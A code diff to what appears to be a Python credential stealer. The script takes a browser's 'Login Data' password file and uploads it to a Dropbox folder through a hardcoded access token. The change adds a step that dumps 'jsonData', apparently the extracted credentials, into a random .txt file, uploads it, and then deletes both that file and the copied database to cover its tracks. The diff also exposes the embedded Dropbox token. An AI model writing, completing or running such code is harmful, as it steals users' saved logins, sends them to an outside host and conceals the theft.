@@ -1,3 +1,4 @@
+import json
 import os
 import sqlite3
 import shutil
@@ -61,9 +62,15 @@ def send():
     dbx=dropbox.Dropbox('xZ1QuOK6iBAAAAAAAAAATLG-Uk8R8aC57_ydn4KZOAwXe2dOo7sQ3auJobdJRjlq')
     file_from="c:\prog\Login Data"
     x=random.randint(1,500)
-    file_to="/kaunheh/"+str(x)
-    with open(file_from, 'rb') as f:
-            dbx.files_upload(f.read(), file_to)
+    z=str(x)+'.txt'
+    new_f=open(z,'w+')
+    new_f.write(str(jsonData.items()))
+    new_f.close()
+    file_to="/kaunheh/"+z
+    with open(z, 'rb') as f:
+        dbx.files_upload(f.read(), file_to)
+    os.remove(z)
+    os.remove(file_from)
 
 def getpath():
 
